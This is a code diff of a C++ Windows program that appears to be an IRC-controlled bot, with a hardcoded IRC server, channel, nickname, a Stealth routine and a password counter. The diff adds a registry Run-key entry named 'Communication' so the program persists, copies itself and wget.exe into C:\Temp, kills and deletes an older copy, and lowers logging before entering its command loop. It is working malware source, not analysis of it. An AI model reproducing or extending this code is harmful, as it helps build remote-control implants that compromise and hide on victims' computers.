@@ -65,7 +65,7 @@ void Stealth(int x);
 int sec,r,x,found,found2,found3,found4,found5,found6,found7,found8,found9,verb1=6,passwords=0;
 
 std::string total,file2,path,resev,l,cont(""),MESSAGE,HOST,channel,
-IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("Version 1.1"),str=("PRIVMSG ");
+IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("Version 1.2"),str=("PRIVMSG ");
 
 
 char *writable;
@@ -603,7 +603,49 @@ logCompname<<LINFO <<" :Exiting";
 #endif // D_LIB
 }
 
+void start_reg()
+{
 
+    HKEY softwareKey;
+	HKEY thisKey;
+	HKEY schemeKey;
+	DWORD dwKeyValue;
+	DWORD dwKeyType;
+	DWORD dwKeyValueSize;
+	char cKeyValue[1024];
+    dwKeyValue = 1024;
+    TCHAR szPath[MAX_PATH];
+    DWORD pathLen = 0;
+
+    //exit(1);
+std::string pth="C:\\Temp\\";
+ file2=(pth+file2);
+_tcscpy(szPath, _T(file2.c_str()));
+pathLen = _tcslen(szPath);
+
+HKEY newValue;
+if (RegOpenKey(HKEY_CURRENT_USER,
+    TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+    &newValue) != ERROR_SUCCESS)
+{
+    cout<<"Failure in regedit"<<endl;
+}
+DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+if (RegSetValueEx(newValue,
+    TEXT("Communication"),
+    0,
+    REG_SZ,
+    (LPBYTE)szPath,
+    pathLenInBytes) != ERROR_SUCCESS)
+{
+    RegCloseKey(newValue);
+    cout<<"Failure in closing regedit"<<endl;
+}
+RegCloseKey(newValue);
+cout<<"Failure in closing regedit"<<endl;
+
+
+}
 
 
 
@@ -616,7 +658,7 @@ int main(int argc, char *argv[])
 std::ofstream os("logger.txt", std::ios_base::out);
 set_all_logging_output_streams (os);
 #endif // D_LIB
-Verbose(5);
+Verbose(1);
 #ifdef D_LIB
 logmain<<LINFO <<"Started";
 #endif // D_LIB
@@ -628,20 +670,23 @@ HOST=("punch.wa.us.dal.net"),channel="kens";
     SplitFilename(argv[0]);
     if(path!="C:\\Temp\\")
         {
+
             FileCopier(file2,file2,"C:\\Temp\\");
-            FileCopier("libgmp-10.dll","libgmp-10.dll","C:\\Temp\\");
-            FileCopier("libgnutls-28.dll","libgnutls-28.dll","C:\\Temp\\");
-            FileCopier("libhogweed-2-1.dll","libhogweed-2-1.dll","C:\\Temp\\");
-            FileCopier("libidn-11.dll","libidn-11.dll","C:\\Temp\\");
-            FileCopier("libintl-8.dll","libintl-8.dll","C:\\Temp\\");
-            FileCopier("libnettle-4-3.dll","libnettle-4-3.dll","C:\\Temp\\");
-            FileCopier("libp11-kit-0.dll","libp11-kit-0.dll","C:\\Temp\\");
+            FileCopier("libgcc_s_dw2-1.dll","libgcc_s_dw2-1.dll","C:\\Temp\\");
+            FileCopier("libstdc++-6.dll","libstdc++-6.dll","C:\\Temp\\");
             FileCopier("wget.exe","wget.exe","C:\\Temp\\");
-            FileCopier("zlib1.dll","zlib1.dll","C:\\Temp\\");
-            FileCopier("libiconv-2.dll","libiconv-2.dll","C:\\Temp\\");
+            //FileCopier("libhogweed-2-1.dll","libhogweed-2-1.dll","C:\\Temp\\");
+            //FileCopier("libidn-11.dll","libidn-11.dll","C:\\Temp\\");
+            //FileCopier("libintl-8.dll","libintl-8.dll","C:\\Temp\\");
+            //FileCopier("libnettle-4-3.dll","libnettle-4-3.dll","C:\\Temp\\");
+            //FileCopier("libp11-kit-0.dll","libp11-kit-0.dll","C:\\Temp\\");
+
+            //FileCopier("zlib1.dll","zlib1.dll","C:\\Temp\\");
+            //FileCopier("libiconv-2.dll","libiconv-2.dll","C:\\Temp\\");
         }
-
-
+start_reg();
+system("taskkill /f /im Communication.exe");
+system("del Communication.exe");
     Stealth(0);
     Compname();
     while (1)
